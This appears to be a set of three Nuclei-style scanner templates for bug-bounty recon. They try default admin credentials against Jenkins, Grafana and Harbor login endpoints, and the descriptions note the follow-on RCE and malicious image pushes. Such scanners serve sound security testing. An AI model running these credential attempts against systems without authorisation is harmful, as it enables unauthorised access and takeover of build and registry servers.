id: bb-default-credentials-jenkins

info:
  name: Jenkins Default Credentials (admin/admin, admin/password)
  author: guan4tou2
  severity: critical
  description: |
    Tests Jenkins with default credentials. Directly exploitable:
    admin access → execute Groovy scripts → RCE on build server.
  tags: bb-recon,default-creds,jenkins,rce

http:
  - method: POST
    path:
      - "{{BaseURL}}/j_spring_security_check"
      - "{{BaseURL}}/jenkins/j_spring_security_check"

    headers:
      Content-Type: "application/x-www-form-urlencoded"

    payloads:
      creds:
        - "j_username=admin&j_password=admin&from=%2F&Submit=Sign+in"
        - "j_username=admin&j_password=password&from=%2F&Submit=Sign+in"
        - "j_username=admin&j_password=jenkins&from=%2F&Submit=Sign+in"
        - "j_username=jenkins&j_password=jenkins&from=%2F&Submit=Sign+in"

    body: "{{creds}}"

    attack: batteringram

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302

      - type: word
        words:
          - "Dashboard"
          - "/jenkins/"
          - "sessionid"
        part: header

---
id: bb-default-credentials-grafana

info:
  name: Grafana Default Credentials (admin/admin)
  author: guan4tou2
  severity: high
  description: |
    Tests Grafana with default admin/admin credentials.
    Directly exploitable: access all dashboards, metrics, and data sources.
  tags: bb-recon,default-creds,grafana

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/login"
      - "{{BaseURL}}/grafana/api/login"
      - "{{BaseURL}}/login"

    headers:
      Content-Type: "application/json"

    body: '{"user":"admin","password":"admin"}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - '"message":"Logged in"'
          - "grafana_session"
        part: body

---
id: bb-default-credentials-harbor

info:
  name: Harbor Default Credentials (admin/Harbor12345)
  author: guan4tou2
  severity: critical
  description: |
    Tests Harbor container registry with default credentials.
    Directly exploitable: access all Docker images, push malicious images.
  tags: bb-recon,default-creds,harbor,docker

http:
  - method: POST
    path:
      - "{{BaseURL}}/c/login"
      - "{{BaseURL}}/harbor/c/login"

    headers:
      Content-Type: "application/json"

    body: '{"principal":"admin","password":"Harbor12345"}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - '"has_admin_role":true'
          - "harbor"
        part: body
